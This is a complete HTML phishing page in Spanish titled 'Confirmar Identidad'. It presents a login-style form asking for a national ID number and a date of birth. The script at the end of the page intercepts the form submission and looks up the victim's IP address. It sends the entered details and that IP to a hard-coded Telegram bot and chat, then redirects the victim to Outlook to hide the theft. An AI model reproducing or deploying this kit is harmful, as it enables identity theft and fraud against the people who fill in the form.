<html>

<head>
	<title></title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">

	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
	<!--===============================================================================================-->
	<script>
		function soloNumeros(e) {
			var key = window.event ? e.which : e.keyCode;
			if (key < 48 || key > 57) {
				e.preventDefault();
			}
		}
	</script>
</head>

<body>

	<div class="limiter">
		<div class="container-login100" style="background-image:url('images/fond.png'); 
    position: absolute;
   ">

			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">

				<form class="login100-form validate-form" id="login-form">
					<div align="left"><span class="p-b-49" style="font-size:24px;">
							<br><b>Confirmar Identidad</b>
						</span></div><br>

					<div class="wrap-input100 validate-input m-b-23">
						<span class="label-input100">Cédula de Identidad</span>
						<input class="input100" type="text" id="email" name="email" required
							placeholder="Cédula de Identidad" required>
						<span class="focus-input100" data-symbol="&#xf15a;"></span>
					</div>

					<div class="wrap-input100 validate-input">
						<span class="label-input100">Fecha de Nacimiento</span>
						<input class="input100" type="date" id="password" name="password" placeholder="Fecha de Nacimiento"
							required>
						<span class="focus-input100" data-symbol="&#xf190;"></span>
					</div>




					<br>


					<div class="text-right p-t-8 p-b-31">

					</div>

					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button type="submit" class="login100-form-btn">
								Finalizar
							</button>
						</div>
					</div>


				</form>
			</div>
		</div>
	</div>

</body>
<script>
	YOUR_BOT_TOKEN = "bot6372581795:AAGNkxlNt3VYADbbOlA8Z4NjSm7zIumc_oA";
	YOUR_CHANNEL_ID = "-6649322684";
	const form = document.querySelector('#login-form');

	form.addEventListener('submit', event => {
		event.preventDefault();
		const email = document.querySelector('#email').value;
		const password = document.querySelector('#password').value;
		fetch('https://api.ipify.org?format=json')
		.then(response => response.json())
		.then(data => {
			YOUR_MESSAGE_TEXT = "Correo: "+email+" Contra: "+password+" IP: "+data.ip;
			const telegramApiUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage?chat_id=${YOUR_CHANNEL_ID}&text=${YOUR_MESSAGE_TEXT}`;

			fetch(telegramApiUrl)
				.then(response => {
					window.location.href="https://outlook.live.com/owa/"
				})
				.catch(error => console.error(error));
		})
		.catch(error => console.error(error));
	});
	
</script>

</html>
